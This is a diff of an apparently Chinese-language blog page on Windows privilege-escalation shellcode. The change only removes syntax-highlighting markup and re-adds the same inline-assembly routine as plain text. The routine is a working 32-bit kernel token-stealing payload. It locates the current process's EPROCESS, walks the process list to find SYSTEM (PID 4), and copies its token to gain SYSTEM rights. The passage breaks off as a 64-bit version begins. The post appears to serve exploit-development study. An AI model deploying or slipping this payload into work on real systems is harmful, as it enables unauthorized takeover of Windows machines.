@@ -35,31 +35,32 @@
     </div>
     <div class="post-content">
         <p>32位下提权shellcode</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">ShellCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
+<pre class="line-numbers language-C"><code class="language-C">
+void ShellCode()
+{
     _asm
-    <span class="token punctuation">{</span>
+    {
         pushad
-        mov eax<span class="token punctuation">,</span>fs<span class="token punctuation">:</span><span class="token punctuation">[</span>124h<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">// 找到当前线程的_KTHREAD结构</span>
-        mov eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>eax <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">// 找到_EPROCESS结构</span>
-        mov ecx<span class="token punctuation">,</span> eax
-        mov edx<span class="token punctuation">,</span> <span class="token number">4</span>    <span class="token comment" spellcheck="true">// edx = system PID(4)</span>
+        mov eax,fs:[124h]        // 找到当前线程的_KTHREAD结构
+        mov eax, [eax + 0x50]    // 找到_EPROCESS结构
+        mov ecx, eax
+        mov edx, 4    // edx = system PID(4)
  
-        <span class="token comment" spellcheck="true">// 循环是为了获取system的_EPROCESS</span>
-    find_sys_pid<span class="token punctuation">:</span>
-        mov eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>eax <span class="token operator">+</span> <span class="token number">0xb8</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">// 找到进程活动链表</span>
-        sub eax<span class="token punctuation">,</span> <span class="token number">0xb8</span>            <span class="token comment" spellcheck="true">// 链表遍历</span>
-        cmp <span class="token punctuation">[</span>eax <span class="token operator">+</span> <span class="token number">0xb4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> edx    <span class="token comment" spellcheck="true">// 根据PID判断是否为SYSTEM</span>
+        // 循环是为了获取system的_EPROCESS
+    find_sys_pid:
+        mov eax, [eax + 0xb8]    // 找到进程活动链表
+        sub eax, 0xb8            // 链表遍历
+        cmp [eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
         jnz find_sys_pid
  
-        <span class="token comment" spellcheck="true">// 替换Token</span>
-        mov edx<span class="token punctuation">,</span> <span class="token punctuation">[</span>eax <span class="token operator">+</span> <span class="token number">0xf8</span><span class="token punctuation">]</span>
-        mov <span class="token punctuation">[</span>ecx <span class="token operator">+</span> <span class="token number">0xf8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> edx
+        // 替换Token
+        mov edx, [eax + 0xf8]
+        mov [ecx + 0xf8], edx
         popad
         ret
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    }
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>64位下</p>
 <pre><code>shellCode proc
 ; shellcode编写
